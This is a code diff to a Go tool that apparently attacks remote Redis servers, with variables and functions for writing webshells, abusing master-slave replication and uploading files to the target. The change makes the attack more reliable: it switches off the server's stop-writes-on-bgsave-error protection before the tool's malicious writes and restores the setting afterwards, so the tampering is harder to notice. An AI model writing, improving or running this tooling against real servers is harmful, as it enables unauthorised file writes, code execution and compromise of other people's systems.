@@ -32,6 +32,7 @@ var (
 	command, rpath, rfile, lfile, webshell, user       string
 	execTemplate, execName                             string
 	b64                                                bool
+	bgErr                                              string
 )
 
 func init() {
@@ -117,6 +118,12 @@ func main() {
 		if err := connection(rhost, rport, pwd); err != nil {
 			fmt.Println(err)
 			return
+		}
+
+		bgErr = configGet("stop-writes-on-bgsave-error")
+
+		if bgErr != "no" {
+			cliInfo("config set stop-writes-on-bgsave-error no")
 		}
 
 		redisDir = configGet("dir")
@@ -231,7 +238,12 @@ func main() {
 		default:
 			redisVersion()
 		}
+
 	}
+
+	defer func() {
+		cliInfo("config set stop-writes-on-bgsave-error " + bgErr)
+	}()
 }
 
 // 连接redis
@@ -254,6 +266,8 @@ func connection(rhost, rport, password string) error {
 
 // redisVersion 查看redis版本
 func redisVersion() {
+
+	fmt.Println(">>> info server")
 	info := rdb.Info(ctx, "server")
 
 	for _, s := range strings.Split(info.Val(), "\r\n") {
@@ -482,6 +496,7 @@ func redisSlave(lhost, lport, dir, dbfilename string) {
 		// 恢复原始配置
 		cliInfo("config set dir " + redisDir)
 		cliInfo("config set dbfilename " + redisDBFilename)
+		cliInfo("config set stop-writes-on-bgsave-error " + bgErr)
 	}()
 }
 
@@ -637,6 +652,7 @@ func redisUpload(lhost, lport, rpath, rfile, lfile string) {
 		closeSlave("upload")
 		cliInfo("config set dir " + redisDir)
 		cliInfo("config set dbfilename " + redisDBFilename)
+
 	}()
 }
 
